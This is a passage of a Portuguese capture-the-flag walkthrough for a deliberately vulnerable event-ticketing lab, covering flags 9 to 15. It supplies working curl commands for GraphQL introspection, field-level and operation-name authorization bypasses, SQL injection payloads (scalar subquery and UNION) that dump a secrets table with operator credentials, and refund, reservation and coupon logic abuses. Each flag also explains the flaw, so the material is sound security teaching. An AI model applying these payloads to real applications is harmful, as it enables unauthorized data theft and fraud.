**O convite.** O `/graphql` não aparece em menu nenhum. Quem o encontra, encontra
pelo JavaScript. A tela `/credenciamento` é a estação de check-in do evento e
carrega `/static/credenciamento.js`; a oitava linha desse arquivo é:

```javascript
var ENDPOINT = "/graphql";
```

O arquivo é servido por `/static`, sem autenticação — você consegue baixá-lo
antes de ter qualquer papel na aplicação. A tela `/credenciamento` em si não
hospeda flag alguma; o bundle dela é que revela o endpoint.

Confirme que o endpoint existe antes de atacar:

```bash
curl -s $ATR/graphql
```

```json
{"servico":"atrium-graphql","versao":"2",
 "mensagem":"envie a consulta em POST (application/json) ou em GET ?query=",
 "introspeccao":"habilitada"}
```

**O percurso.**

```bash
# 1. quais campos existem na raiz
curl -s -X POST $ATR/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'
```

Saem cinco: `evento`, `filaCredenciamento`, `internalAudit`, `platformSettings`
e `debugInfo`. Mas repare que **`description` volta `null` em todos os cinco** —
e é fácil parar aqui achando que não há mais nada a extrair.

As descrições existem; elas estão presas aos **tipos**, não aos campos da raiz.
Trocar o alvo da introspecção muda tudo:

```bash
# 2. as descrições, que moram nos tipos
curl -s -X POST $ATR/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"{ __schema { types { name description } } }"}'
```

```
AuditoriaInterna       Consulta de auditoria interna. Não é usada por nenhuma tela.
ConfiguracaoPlataforma Configuração da plataforma. Operação administrativa.
RelatorioReceita       Relatório financeiro do evento.
```

É aí que o mapa aparece: um dos tipos se anuncia como não usado por tela
nenhuma, e é exatamente o que você quer pedir.

```bash
# 3. o campo que nenhuma tela usa
curl -s -X POST $ATR/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"{ internalAudit { geradoEm registros chaveConformidade } }"}'
```

A resposta traz `chaveConformidade` no formato `OCEAN{09-<12 hex>}`.

O endpoint aceita três formatos de corpo, e vale conhecer os três porque em
algum momento você vai querer o mais curto:

| Forma | Como enviar |
|---|---|
| JSON | `-H 'content-type: application/json' -d '{"query":"..."}'` |
| `application/graphql` | `-H 'content-type: application/graphql' -d '{ internalAudit { ... } }'` |
| GET | `GET /graphql?query={ internalAudit { chaveConformidade } }` |

**Por que funciona.** Introspecção não é uma falha em si — é uma ferramenta de
desenvolvimento. Neste laboratório, ela revela campos administrativos que podem ser consultados
sem autorização suficiente. Desabilitar a introspecção esconderia o mapa, mas
o controle de acesso ainda precisaria ser corrigido nos campos sensíveis. As flags 10 e 11
são as duas perguntas naturais depois desse mapa — "esses campos checam
autorização?" e "o que exatamente a checagem olha?".

**Atenção ao beco.** `debugInfo` devolve versão, commit e o nome do evento —
tudo já público em outras telas. Não há flag ali. Ele existe para medir se você
distingue "campo escondido" de "campo com segredo".

---

## Flag 10 — autorização em GraphQL é por campo, não por endpoint

`GraphQL` · 3 pontos · não exige sessão · **o nome do campo muda por variante**

**A falha.** O tipo `Evento` tem um campo de faturamento cujo resolvedor não
checa papel nenhum. Um participante comum — ou ninguém, sem sessão — lê receita
bruta, líquida, número de ingressos, ticket médio e o `codigoConformidade` do
evento inteiro. Esse último é a flag 10.

**O nome do campo muda de instância para instância.** É o mesmo mecanismo, com
outro rótulo. Confira a sua na tabela:

| Variante | Campo de receita no tipo `Evento` |
|:--:|---|
| A | `revenueReport` |
| B | `salesSummary` |
| C | `financialOverview` |
| D | `receitaConsolidada` |
| E | `receitaConsolidada` |
| F | `revenueReport` |
| G | `salesSummary` |
| H | `financialOverview` |

Você não precisa dessa tabela para resolver: a introspecção da flag 9 já te
entregou o nome. Ela serve para conferir se você leu o schema da sua instância
ou o do colega.

**O convite.** A introspecção da flag 9, com um grau a mais de profundidade —
pedir o schema inteiro em vez de só os campos de raiz:

```bash
curl -s -X POST $ATR/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"{ __type(name:\"Evento\") { fields { name type { name } } } }"}'
```

O campo com tipo `RelatorioReceita` é o seu. O tipo tem descrição própria:
*"Relatório financeiro do evento."*

**O percurso.** Troque `<campoDeReceita>` pelo nome da sua variante:

```bash
curl -s -X POST $ATR/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"{ evento { nome ingressosVendidos <campoDeReceita> { brutoCentavos liquidoCentavos ingressos ticketMedioCentavos codigoConformidade } } }"}'
```

Exemplo concreto, variante A:

```bash
curl -s -X POST $ATR/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"{ evento { nome revenueReport { brutoCentavos liquidoCentavos ingressos ticketMedioCentavos codigoConformidade } } }"}'
```

O argumento `slug` de `evento` é opcional; sem ele o resolvedor devolve o evento
principal da instância.

**Por que funciona.** Neste laboratório, consultas com permissões diferentes
chegam ao mesmo endpoint `/graphql`. Por isso, permitir o acesso à rota não
basta: os campos de receita também precisam verificar o papel de quem consulta.
Essa verificação está ausente no resolvedor, a função que obtém os dados do campo.

Para demonstrar o problema, compare a mesma query com e sem o campo de receita.
A consulta dos dados públicos é legítima; o acréscimo desse campo expõe dados
financeiros sem a autorização correspondente.

---

## Flag 11 — a autorização decide pelo rótulo da operação

`GraphQL` · 4 pontos · não exige sessão

Esta flag explora o critério usado para decidir se uma operação GraphQL é
administrativa.

**A falha.** Existe um middleware de autorização no `POST /graphql`. Ele pega o
nome da operação, compara com uma lista de nomes administrativos —
`PlatformSettings`, `AdminSettings`, `PlataformaConfig`, sem diferenciar
maiúsculas — e, se bater, exige papel `operador` ou superior. Ele **nunca olha o
conteúdo da query**. Trocar o nome contorna a checagem inteira.

**O convite.** A própria recusa entrega o mecanismo. Tente o caminho óbvio:

```bash
curl -s -X POST $ATR/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"query PlatformSettings { platformSettings { ambiente chaveConformidade } }","operationName":"PlatformSettings"}'
```

```json
{"errors":[{"message":"operação 'PlatformSettings' é administrativa e não é permitida para o papel 'anonimo'",
 "extensions":{"code":"OPERACAO_NAO_AUTORIZADA","operacao":"PlatformSettings","papel":"anonimo"}}]}
```

Leia a mensagem devagar. Ela não diz "o campo `platformSettings` é restrito".
Ela diz que **a operação chamada `PlatformSettings`** é administrativa. A
pergunta seguinte se escreve sozinha: e se ela se chamasse outra coisa?

**O percurso.**

```bash
curl -s -X POST $ATR/graphql \
  -H 'content-type: application/json' \
  -d '{"query":"query Fila { platformSettings { ambiente conectorInterno mfaProvisionamento chaveConformidade } }","operationName":"Fila"}'
```

`Fila` é arbitrário: qualquer nome fora da lista serve. A flag 11 é o
`chaveConformidade` dessa resposta.

**Quatro tentativas que não funcionam, e por quê.** Vale gastar tempo nelas,
porque cada uma ensina onde a checagem realmente mora.

| Tentativa | Resultado | Motivo |
|---|---|---|
| Omitir `operationName` numa operação nomeada | bloqueado | O servidor deriva o rótulo do documento: operação nomeada usa o próprio nome. |
| `{ platformSettings { ... } }` (operação anônima) | bloqueado | Numa operação anônima o servidor procura um campo de raiz administrativo e usa **esse nome** como rótulo. |
| `{ debugInfo { versao } platformSettings { ... } }` | bloqueado | Pela mesma regra: a varredura acha o campo administrativo mesmo ele não sendo o primeiro. |
| `{ x: platformSettings { ... } }` (alias) | bloqueado | A derivação lê o nome do **campo**, não o apelido. Alias não muda nada. |

Ou seja: o servidor sabe perfeitamente derivar o rótulo correto a partir do
documento — e mesmo assim, quando o cliente manda um `operationName`, é no
cliente que ele acredita. Essa é a frase da flag.

**Um segundo caminho, e o que ele ensina.** O controle está implementado no
handler de `POST`. O handler de `GET` do mesmo endpoint executa a query sem
passar por ele:

```bash
curl -s -G $ATR/graphql \
  --data-urlencode 'query={ platformSettings { ambiente conectorInterno chaveConformidade } }'
```

Isso entrega a flag sem nenhum truque de nome. Os dois caminhos revelam falhas
relacionadas: a checagem do `POST` pode ser contornada pelo nome da operação, e
o `GET` sequer passa por ela. A lição é a mesma em outra escala — controle
amarrado a um ponto de entrada em vez de ao recurso protegido.

**Por que funciona.** Um controle de acesso precisa decidir sobre **o que está
sendo pedido**. Aqui ele decide sobre **como o pedido foi etiquetado**, e a
etiqueta é escrita por quem faz o pedido. É a mesma classe de erro de um WAF que
bloqueia pela string `admin` na URL, ou de um filtro que confia no
`Content-Type` declarado.

**A ligação com o resto da prova.** A resposta desta flag traz dois campos que
não são flag e valem muito mais do que ela:

- `conectorInterno: "http://127.0.0.1:8088/"` — o primeiro estágio do SSRF da flag 22.
- `mfaProvisionamento` — a URI `otpauth://` do segundo fator da conta de operador.

Anote os dois agora. Eles voltam na flag 22 e na flag final.

---

## Flag 12 — SQL injection na expressão de ordenação

`SQL Injection` · 5 pontos · exige papel de organizador · **carrega um fragmento
do cofre** · a tela e o parâmetro mudam por variante

Esta flag é a dobradiça da prova. Ela não vale só 5 pontos: o que sai junto com
ela é a credencial da conta de operador, que abre a flag 22 e a flag final —
mais 25 pontos. Quem parou no primeiro achado perdeu um quarto da atividade.

**Pré-requisito.** O painel `/painel/...` exige organizador. Se você não fez a
flag 8 (escalada pelo convite de equipe), não tem como chegar aqui — é a
dependência mais cara da prova.

**A falha.** O parâmetro de ordenação passa por uma allowlist que traduz rótulo
de tela para nome de coluna: `valor` vira `i.valor_pago`, `data` vira
`i.criado_em`. Na tela vulnerável da sua variante, o que **não** está na lista
não é recusado — passa direto para o SQL:

```python
expr = permitidas.get(ordem, ordem) if ordem else padrao
```

`permitidas.get(ordem, ordem)`: se não achar, o valor padrão é a própria
entrada. A consulta montada é:

```sql
SELECT <6 colunas>, (<expressão que você mandou>) AS chave_ordenacao
  FROM <origem> WHERE <filtro> = <id do evento>
  ORDER BY chave_ordenacao LIMIT 200
```

**Qual é a sua tela.** Só uma das quatro é vulnerável, e depende da variante:

| Variante | Tela | Rota | Parâmetro |
|:--:|---|---|---|
| A | Relatório de vendas | `/painel/relatorios/vendas` | `sort` |
| B | Exportação de convidados | `/painel/convidados/exportar` | `ordenar_por` |
| C | Cupons | `/painel/cupons` | `order` |
| D | Extrato de repasses | `/painel/repasses` | `sortBy` |
| E | Relatório de vendas | `/painel/relatorios/vendas` | `sort` |
| F | Exportação de convidados | `/painel/convidados/exportar` | `ordenar_por` |
| G | Cupons | `/painel/cupons` | `order` |
| H | Extrato de repasses | `/painel/repasses` | `sortBy` |

As quatro telas existem nas oito instâncias e as quatro aceitam o parâmetro
delas. Nas três não vulneráveis, valor fora da lista cai silenciosamente na
ordenação padrão. Testar as quatro é o gesto certo; concluir "não tem SQLi" por
ter testado só uma é o erro mais comum.

**O convite.** Um valor inválido na tela certa devolve o erro do motor, inteiro:

```json
{"erro":"ordenacao_invalida","motor":"sqlite",
 "mensagem":"no such column: nao_existe",
 "expressao_recebida":"nao_existe",
 "colunas_conhecidas":["ticket","participante","lote","valor","canal","data"]}
```

E esse diagnóstico chega também pelo navegador: a página continua de pé com o
erro em destaque, em vez de virar um 500 genérico. `no such column` vindo do
SQLite, com a sua string ecoada de volta, é a confirmação de que a sua entrada
virou SQL.

**Por que `UNION SELECT` não sairia de um `ORDER BY` puro.** Vale entender isso
porque é a diferença entre ler sobre SQLi e saber onde ela cai.

Se a injeção fosse *dentro da cláusula `ORDER BY`* — algo como
`ORDER BY <entrada>` — o mesmo payload de `UNION` usado abaixo não se encaixaria nessa posição. A gramática
do SQL põe o operador de composição (`UNION`, `INTERSECT`, `EXCEPT`) **antes** da
cláusula de ordenação: num `SELECT ... UNION SELECT ... ORDER BY ...`, o
`ORDER BY` pertence ao resultado composto inteiro, não ao último `SELECT`. Não
existe posição, depois do `ORDER BY`, onde caiba um `UNION` que se anexe ao
`SELECT` original. É por isso que injeção em ordenação normalmente é cega, e se
explora com `CASE WHEN`, com tempo, ou com números de coluna.

Aqui a injeção **não** cai no `ORDER BY`. Ela cai numa expressão da lista do
`SELECT`:

```sql
SELECT col1, ..., col6, (AQUI) AS chave_ordenacao FROM ...
```

Essa posição aceita uma subconsulta escalar — um `SELECT` entre parênteses que
devolve um valor só — e o valor **volta como coluna no relatório**. Extração
direta, sem canal cego, sem tempo. É também de onde sai o `UNION`: fechando o
parêntese você reescreve o resto da consulta, incluindo o `FROM`.

**O percurso — caminho 1: subconsulta escalar.** É o mais curto e funciona nas
quatro telas sem adaptação. Troque `<param>` pelo parâmetro da sua variante:

```bash
# confirma execução de SQL
curl -s -G -b cookies.txt "$ATR/<rota-da-sua-variante>" \
  --data-urlencode "<param>=sqlite_version()" --data-urlencode "formato=json"

# enumera as tabelas
curl -s -G -b cookies.txt "$ATR/<rota-da-sua-variante>" \
  --data-urlencode "<param>=SELECT group_concat(name) FROM sqlite_master WHERE type='table'" \
  --data-urlencode "formato=json"

# despeja o cofre de segredos
curl -s -G -b cookies.txt "$ATR/<rota-da-sua-variante>" \
  --data-urlencode "<param>=SELECT group_concat(chave||'='||valor, ' | ') FROM platform_secrets" \
  --data-urlencode "formato=json"
```

Exemplo fechado, variante A:

```bash
curl -s -G -b cookies.txt "$ATR/painel/relatorios/vendas" \
  --data-urlencode "sort=SELECT group_concat(chave||'='||valor, ' | ') FROM platform_secrets" \
  --data-urlencode "formato=json"
```

`formato=json` (ou o cabeçalho `Accept: application/json`) devolve o relatório
como JSON, o que é muito mais fácil de ler que o HTML. No navegador, o mesmo
payload funciona colado na barra de endereço — o navegador codifica os espaços
para você.

**O percurso — caminho 2: `UNION SELECT`.** Mais trabalhoso, e serve para
provar que você entendeu a forma da consulta. São 7 valores: as 6 colunas da
tela mais o `chave_ordenacao`. Como você fecha o parêntese e escreve o seu
próprio `FROM`, precisa **reproduzir a origem da tela** — as 6 colunas continuam
na consulta e referenciam os apelidos de tabela (`i.`, `u.`, `l.`, `c.`, `r.`).
Se o `FROM` não declarar esses apelidos, o motor reclama de coluna inexistente.

| Tela | Cláusula `FROM` a reproduzir |
|---|---|
| Relatório de vendas | `ingresso i LEFT JOIN usuario u ON u.id=i.dono_id LEFT JOIN lote l ON l.id=i.lote_id` |
| Exportação de convidados | `ingresso i` |
| Cupons | `cupom c` |
| Extrato de repasses | `repasse r` |

Payload, na tela de relatório de vendas:

```
sort=1) AS chave_ordenacao FROM ingresso i LEFT JOIN usuario u ON u.id=i.dono_id LEFT JOIN lote l ON l.id=i.lote_id WHERE 1=0 UNION SELECT chave,valor,'','','','','' FROM platform_secrets --
```

Na tela de cupons, o mesmo com o `FROM` trocado:

```
order=1) AS chave_ordenacao FROM cupom c WHERE 1=0 UNION SELECT chave,valor,'','','','','' FROM platform_secrets --
```

Passe por `--data-urlencode` (as aspas simples dentro do payload pedem aspas
duplas no shell):

```bash
curl -s -G -b cookies.txt "$ATR/painel/cupons" \
  --data-urlencode "order=1) AS chave_ordenacao FROM cupom c WHERE 1=0 UNION SELECT chave,valor,'','','','','' FROM platform_secrets --" \
  --data-urlencode "formato=json"
```

Três detalhes desse payload:

- `1)` fecha o parêntese que o código abriu, e `AS chave_ordenacao` mantém o
  apelido que o `ORDER BY` original esperava.
- `WHERE 1=0` descarta as linhas legítimas, deixando só as suas no resultado.
- `--` comenta o restante da consulta montada pela aplicação, inclusive o
  `ORDER BY` e o `LIMIT`. A SQL é construída em uma linha só, então o comentário
  de linha mata tudo o que vem depois.

**O que sai de `platform_secrets`.** Oito entradas, e apenas uma é a flag:

| Chave | O que é |
|---|---|
| `integracao.chave_recuperacao` | **a flag 12** |
| `integracao.selo_recuperacao` | o fragmento do cofre desta flag |
| `operador.usuario` | e-mail da conta de operador da plataforma |
| `operador.senha_provisoria` | a senha dela |
| `operador.mfa_provisionamento` | um ponteiro dizendo que o segundo fator é mantido pelo serviço de configuração |
| `conciliacao.lote_corrente` | lote de conciliação (reaparece na cadeia de SSRF) |
| `webhook.assinatura` | segredo de assinatura dos webhooks de saída |
| `smtp.relay` | relay de envio transacional |

**Leia essa tabela outra vez.** O achado de maior valor não é a flag: são
`operador.usuario` e `operador.senha_provisoria`. Com elas você entra na conta
de operador — e o `operador.mfa_provisionamento` diz onde está o segundo fator,
que é justamente o `mfaProvisionamento` que a flag 11 te devolveu. A cadeia
12 → 22 → final vale 25 pontos e começa aqui.

Se a sua extração pegou a flag inteira numa linha devolvida, a tela dispara um
banner de conformidade que classifica **o vazamento inteiro** e diz quantas
entradas o cofre guarda. Se você extraiu em pedaços ou pelo canal de erro, o
banner não dispara — mas o fragmento do cofre está na própria tabela, como
entrada vizinha, alcançável por qualquer técnica. Você não perde a flag final
por ter extraído do jeito difícil.

**O beco obrigatório.** A mesma injeção alcança uma tabela chamada `flags`. Ela
contém apenas placeholders: `reservado`, `migrado`, `revogado`, hashes
truncados de 16 dígitos, observações do tipo "movido para o cofre em 2026-03".
Nenhum valor de flag. Ela existe para separar quem enumera o banco de quem para
no primeiro nome que parece promissor.

**Limites do motor, para você não perder tempo.** O driver compila um único
statement — **não há empilhamento**, `; DROP ...` não vai a lugar nenhum. Não há
`executescript`, `ATTACH` nem extensão carregável, e não há função de sistema de
arquivos habilitada. A consulta livre tem teto de 5 segundos e teto de tamanho
de blob; se você estourar o tempo, o erro que volta é
`interrupted`, pelo mesmo canal do erro-guia.

**Por que funciona.** Duas coisas se somam. A primeira é a allowlist que falha
aberta: um `dict.get(chave, chave)` usa a entrada crua como valor padrão, e o
que deveria ser "recuso o que não conheço" virou "repasso o que não conheço".
O segundo problema é a **posição** da injeção: ela cai numa expressão que
o relatório devolve como coluna, e é isso que torna a extração visível em vez de
cega. A tabela `flags` é um desvio: os valores reais estão em `platform_secrets`.

---

## Flag 13 — o reembolso credita os dois lados

`Business Logic` · 5 pontos · exige duas contas

**A falha.** Quando um ingresso é reembolsado, a aplicação credita quem o porta
no momento do pedido. E, se o ingresso mudou de mãos por uma transferência
aceita, ela credita **também** o vendedor original, pelo valor que ele pagou. Um
pagamento, dois créditos.

No código: depois de inserir o crédito do portador, o endpoint procura uma
transferência aceita para aquele ingresso e, se o vendedor não for o próprio
solicitante, insere um segundo crédito em nome dele.

**O convite.** A `/politica-reembolso` descreve a regra e, sem querer, descreve
a falha:

> "o crédito é lançado para quem consta como portador no momento do pedido. O
> pagamento original permanece registrado no histórico do comprador inicial,
> para fins de conciliação contábil."

Duas relações distintas — quem pagou e quem porta — enunciadas lado a lado. A
aplicação as trata como se fossem a mesma.

**O percurso.** Crie duas contas usando o [código da variante](COMO-SUBIR.md#cadastro).

Com as duas contas criadas — chame de A e B —, o login é em dois passos:

```bash
BASE=$ATR

# login: devolve um challenge
curl -s -c a.txt -X POST $BASE/api/auth/login -H 'content-type: application/json' \
  -d '{"email":"a@exemplo.local","senha":"senha-da-conta-a"}'
# {"step":"finalize","challenge":"...","fatores_esperados":["password"], ...}

# finaliza: grava o cookie de sessão
curl -s -b a.txt -c a.txt -X POST $BASE/api/auth/session/finalize \
  -H 'content-type: application/json' \
  -d '{"challenge":"<challenge>","factors":["password"]}'
```

Repita para a conta B em `b.txt`. Agora a sequência:

```bash
# 1. A compra um ingresso (lote_id: leia as opções do select em /comprar)
curl -s -b a.txt -X POST $BASE/api/pedidos -H 'content-type: application/json' \
  -d '{"lote_id":2,"quantidade":1}'
# → {"pedido_id":..,"ingressos":["<TICKET>"], ...}

# 2. A transfere o ingresso para o e-mail de B
curl -s -b a.txt -X POST $BASE/api/transferencias -H 'content-type: application/json' \
  -d '{"ticket_id":"<TICKET>","para_email":"b@exemplo.local"}'
# → {"transferencia_id":<ID>, ...}

# 3. B aceita
curl -s -b b.txt -X POST $BASE/api/transferencias/<ID>/aceitar

# 4. B pede o reembolso
curl -s -b b.txt -X POST $BASE/api/reembolsos -H 'content-type: application/json' \
  -d '{"ticket_id":"<TICKET>"}'
# → {"status":"concluido","valor":...,"creditados":["U-.....","U-....."]}
```

O campo `creditados` com **dois** UIDs é a evidência do bug. A flag, porém, não
está nessa resposta: abra `/carteira` **com a conta B**.

```bash
curl -s -b b.txt $BASE/carteira | grep -i conformidade
```

A tela entrega a flag quando o saldo de créditos da conta excede o total
legitimamente pago por ela. B pagou zero e tem crédito — a condição dispara.

**Se travou aqui.** Os dois motivos mais comuns:

- **Fez tudo com uma conta só.** O segundo crédito só é inserido quando o
  vendedor é diferente do solicitante (`de_id != u.id`). Transferir para si
  mesmo não produz nada.
- **Abriu a carteira com a conta errada.** Com a conta A, o saldo (o
  reembolso-origem) é menor ou igual ao que ela pagou, e a condição não dispara.
  É a conta B — a que não pagou nada — que tem saldo maior que o pago.

**Por que funciona.** A aplicação mantém duas relações entre uma pessoa e um
ingresso: *comprou* e *porta*. O reembolso deveria devolver dinheiro a quem
pagou, uma vez. Em vez disso ele devolve a quem porta (regra de produto
razoável) e, num gesto de "ninguém pode sair no prejuízo", também a quem
vendeu — sem notar que esses dois créditos saem de um único pagamento.

Receber crédito após um pedido de reembolso, por si só, é um comportamento
normal. A falha está na assimetria, que se comprova comparando quanto entrou na
carteira, quanto foi efetivamente pago e por quem.

---

## Flag 14 — a reserva é reaproveitada

`Business Logic` · 6 pontos · exige decodificar um QR code

**A falha.** A confirmação de uma reserva não revalida duas coisas: o estado do
lote e se o comprovante já foi consumido. Ela valida a validade de 20 minutos e
valida o código do comprovante — e para por aí. O resultado é que existem **dois
caminhos** para a mesma flag, e os dois entregam:

| Caminho | O que você faz | O que sai |
|---|---|---|
| (a) comprovante reusado | confirma a mesma reserva duas vezes, com o mesmo código | um segundo ingresso para o mesmo assento |
| (b) lote fechado depois da reserva | reserva no lote *Última chamada*, compra a última vaga, e só então confirma | ingresso emitido em lote esgotado |

A resposta diz qual dos dois ocorreu, no campo `aviso`, e no caminho (a) inclui
`emissoes_deste_comprovante`.

**A etapa que não é textual.** O código do comprovante — `qr_token` — **só
existe dentro da imagem do QR**. Ele não aparece em resposta de API, nem no
HTML, nem em atributo, nem em cookie. O QR é PNG, nunca SVG, justamente para que
a etapa de leitura de imagem exista de verdade: em SVG os módulos seriam texto
no DOM e dariam para ler no código-fonte.

O QR tem margem de quatro módulos e escala de oito pixels por módulo. Se a
leitura falhar, use a imagem original, sem redimensioná-la, ou tente outro
decodificador. A câmera de um celular também pode ler o código na tela.

**O convite.** Três pistas plantadas:

- A `/ajuda` avisa que *"por segurança, o código do comprovante é impresso
  apenas na imagem do QR"*.
- A tela `/comprar`, no bloco "Reservar assento", declara em negrito: **"O
  comprovante é de uso único"**. Essa frase é o convite do caminho (a) — uma
  aplicação que promete unicidade está dizendo que a unicidade importa.
- A home mostra o lote **Última chamada** com 1 vaga de 60. Essa montagem é o
  caminho (b), e está plantada nos dados iniciais.

**O percurso — caminho (b), o mais didático.**

```bash
BASE=$ATR

# 1. reserva no lote "Última chamada" enquanto ele está aberto
curl -s -b a.txt -X POST $BASE/api/reservas -H 'content-type: application/json' \
  -d '{"lote_id":3}'
# → {"hold_id":"<HOLD>","comprovante_qr":"/reservas/<HOLD>/qr.png",
#    "confirmar_em":"/api/reservas/<HOLD>/confirmar","expira_em_minutos":20, ...}

# 2. baixa e decodifica o comprovante
curl -s -b a.txt $BASE/reservas/<HOLD>/qr.png -o hold.png
zbarimg --raw hold.png
# → {"h":"<HOLD>","k":"<TOKEN>","a":"C17"}

# 3. compra a última vaga: o lote vira "esgotado"
curl -s -b a.txt -X POST $BASE/api/pedidos -H 'content-type: application/json' \
  -d '{"lote_id":3,"quantidade":1}'

# 4. confirma a reserva feita antes do fechamento
curl -s -b a.txt -X POST $BASE/api/reservas/<HOLD>/confirmar \
  -H 'content-type: application/json' -d '{"qr_token":"<TOKEN>"}'
# → {"status":"confirmado","lote_status":"esgotado","conformidade":"OCEAN{14-...}",
#    "aviso":"reserva confirmada fora da janela de disponibilidade do lote"}
```

Sem `zbarimg` à mão, qualquer decodificador serve. Em Python:

```python
import cv2
print(cv2.QRCodeDetector().detectAndDecode(cv2.imread("hold.png"))[0])
```

```python
from pyzbar.pyzbar import decode
from PIL import Image
print(decode(Image.open("hold.png"))[0].data.decode())
```

Ou, sem nenhuma ferramenta: a tela `/comprar` já mostra a imagem do QR depois de
reservar, com um campo para digitar o código ao lado. Aponte o celular para a
tela, leia o JSON, digite o `k` no campo e clique em **Confirmar reserva**. É o
percurso pela interface, e conta igual.

**O percurso — caminho (a).** Idêntico até o passo 2, e então:

```bash
# confirma uma vez — ingresso legítimo
curl -s -b a.txt -X POST $BASE/api/reservas/<HOLD>/confirmar \
  -H 'content-type: application/json' -d '{"qr_token":"<TOKEN>"}'

# confirma de novo, o MESMO comprovante
curl -s -b a.txt -X POST $BASE/api/reservas/<HOLD>/confirmar \
  -H 'content-type: application/json' -d '{"qr_token":"<TOKEN>"}'
# → "aviso":"este comprovante já havia sido confirmado e emitiu um segundo
#            ingresso para o mesmo assento"
```

Pela interface é ainda mais direto: o botão **Confirmar reserva** continua na
tela depois do primeiro clique. Clique de novo.

Para isolar o caminho (a) do (b), faça-o no **Lote regular**, que tem centenas
de vagas. Se você usar o *Última chamada*, a primeira confirmação já esgota o
lote e a segunda dispara os dois caminhos ao mesmo tempo — a flag sai, mas o
diagnóstico fica embaralhado.

**Se travou aqui.** Pontos de atrito conhecidos:

- **`comprovante_invalido`**: você mandou o `h` (o hold) em vez do `k` (o
  token). São campos diferentes do mesmo JSON.
- **`reserva_expirada`**: a validade de 20 minutos é aplicada de verdade. Não
  trava ninguém — crie outra reserva e refaça; as duas confirmações do
  caminho (a) acontecem em segundos.
- **`lote_indisponivel` ao reservar**: o lote já esgotou. `POST /api/reservas`
  recusa lote fechado; o que não recusa é a **confirmação** de uma reserva feita
  antes. Essa distinção é exatamente a flag.

**Por que funciona.** Uma reserva é uma promessa com prazo: "este lugar é seu
por 20 minutos". A confirmação é o momento em que a promessa vira ingresso, e é
onde todas as condições precisam ser conferidas **de novo** — porque o mundo
mudou entre um passo e outro. A aplicação confere a promessa (o prazo, o
código) e não confere o mundo (o lote ainda tem vaga?) nem o próprio consumo (a
promessa já foi cobrada?).

É a mesma classe de erro de um cupom de uso único que não marca o uso, ou de um
link de redefinição de senha que continua válido depois de usado: **o estado é
lido no início do fluxo e nunca revalidado no fim**.

Os dois caminhos permitem verificar separadamente as revalidações ausentes.
Em ambos, a leitura do QR é uma etapa necessária para obter o token.

---

## Flag 15 — o cupom é conferido numa base e abatido de outra

`Business Logic` · 6 pontos · exige participante · **carrega um fragmento do
cofre** · valores mudam por variante

**A falha.** Não é "ordem do desconto". A regra do cupom faz duas contas em
**bases diferentes**:

| Conta | Base usada |
|---|---|
| Elegibilidade — o subtotal atinge o mínimo? | o subtotal **cheio** |
| Abatimento — quanto sai do total? | o valor **já com o desconto de lote** |

O porteiro confere o valor cheio; o caixa desconta do valor reduzido. Sempre que
o valor com desconto ficar menor que o próprio cupom, o total fica negativo — e
a aplicação registra o pedido mesmo assim.

No código:

```python
if subtotal < cupom["minimo_centavos"]:      # confere contra o subtotal cheio
    raise HTTPException(422, ...)
desconto = cupom["valor_centavos"]
apos_lote = subtotal - subtotal * lote["desconto_pct"] // 100
total = apos_lote - desconto                 # abate do valor já reduzido
```

**A aritmética.** Chame o subtotal de `S`, o desconto de lote de `L%` e o valor
do cupom de `C`. O total zera quando `S × (1 − L/100) = C`, e o cupom só é
aceito a partir de `S ≥ mínimo`. Desconsiderando o arredondamento em centavos, o intervalo em que o total é
zero ou negativo é:

```
mínimo ≤ S ≤ C × 100 / (100 − L)
```

Ela existe porque o mínimo foi calibrado contra o subtotal **cheio** — se
tivesse sido calibrado contra a mesma base do abatimento, a janela seria vazia.

**Você não digita o valor.** Você monta o subtotal escolhendo a quantidade de
ingressos (1 a 6) e quais adicionais inclui (4 opções, qualquer subconjunto). São
96 combinações, e **exatamente uma** cai na janela. Dá para calcular com a
fórmula acima; dá também para varrer as 96, embora isso exija mais tentativas.

**O convite.** A tela `/comprar` enuncia a regra sem apontar o erro — *"o
desconto de lote é aplicado primeiro, e o cupom é abatido do valor
resultante"* — e o recibo cola as duas bases uma na outra:

```
Subtotal                                       R$ 255,00
Desconto de lote (35%)                       − R$  89,25
Após desconto de lote                          R$ 165,75
Cupom XXXXXXXX (exige subtotal ≥ R$ 226,00)  − R$ 170,00
Total                                        − R$   4,25
```

Ler *"exige subtotal ≥ R$ 226,00"* na mesma linha de um abatimento sobre
R$ 165,75 é o momento em que a incoerência aparece. Se você chegou perto e não
viu, era essa linha.

**A combinação da sua variante.** Todas usam **1 ingresso** e o cupom-alvo. Os
adicionais estão numerados na ordem em que aparecem na tela:

| Var. | Ingresso | Lote | Cupom (mínimo) | Janela | Adicionais a marcar | Subtotal | Total |
|:--:|--:|--:|---|---|---|--:|--:|
| A | R$ 180,00 | 35% | R$ 170,00 (R$ 226,00) | 226,00 – 261,53 | 1 e 2 — Workshop de hemodinâmica + Jantar de confraternização | R$ 255,00 | −R$ 4,25 |
| B | R$ 95,00 | 20% | R$ 105,00 (R$ 121,00) | 121,00 – 131,25 | 2 — Kit do festival | R$ 130,00 | −R$ 1,00 |
| C | R$ 240,00 | 45% | R$ 180,00 (R$ 276,00) | 276,00 – 327,27 | 1 e 2 — Rodada de negócios + Almoço executivo | R$ 305,00 | −R$ 12,25 |
| D | R$ 60,00 | 15% | R$ 75,00 (R$ 61,00) | 61,00 – 88,23 | 1 — Kit de hardware | R$ 85,00 | −R$ 2,75 |
| E | R$ 320,00 | 50% | R$ 380,00 (R$ 656,00) | 656,00 – 760,00 | 1 e 2 — Jantar de premiação + Sessão de coaching | R$ 755,00 | −R$ 2,50 |
| F | R$ 145,00 | 30% | R$ 160,00 (R$ 186,00) | 186,00 – 228,57 | 2 — Coquetel de abertura | R$ 215,00 | −R$ 9,50 |
| G | R$ 75,00 | 25% | R$ 85,00 (R$ 96,00) | 96,00 – 113,33 | 2 — Almoço pedagógico | R$ 100,00 | −R$ 10,00 |
| H | R$ 260,00 | 40% | R$ 310,00 (R$ 501,00) | 501,00 – 516,66 | 1 e 2 — Workshop técnico + Jantar da comunidade | R$ 515,00 | −R$ 1,00 |

**O percurso.** O código do cupom é gerado por instância — leia-o na tabela de
